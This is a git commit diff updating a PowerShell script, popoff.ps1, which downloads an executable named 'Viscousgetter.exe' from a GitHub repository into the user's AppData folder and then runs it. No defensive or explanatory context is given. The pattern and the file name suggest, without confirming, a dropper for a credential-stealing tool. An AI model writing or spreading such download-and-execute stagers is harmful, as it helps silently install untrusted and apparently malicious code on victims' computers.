78cc92cddb63a72d6c3b8e0afb65e65cd4fb7082
Zyg0s <weizeeer@gmail.com>
2024-12-04 17:29:28 +0100

    Update popoff.ps1

--- popoff.ps1
+++ popoff.ps1
@@ -1,7 +1,15 @@
-try {
-    Invoke-WebRequest -Uri $VIS -OutFile $VISPath
+$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
+$VISPath = "$env:AppData\Viscousgetter.exe"
+
+# Download the file
+Write-Host "Downloading the executable..."
+Invoke-WebRequest -Uri $VIS -OutFile $VISPath
+
+# Check if the file exists
+if (Test-Path $VISPath) {
+    Write-Host "File downloaded successfully. Attempting to execute..."
     Start-Sleep -Seconds 5
-    Start-Process -FilePath $VISPath -ErrorAction Stop
-} catch {
-    Write-Error $_.Exception.Message
+    Start-Process -FilePath $VISPath
+} else {
+    Write-Error "Failed to download the executable."
 }
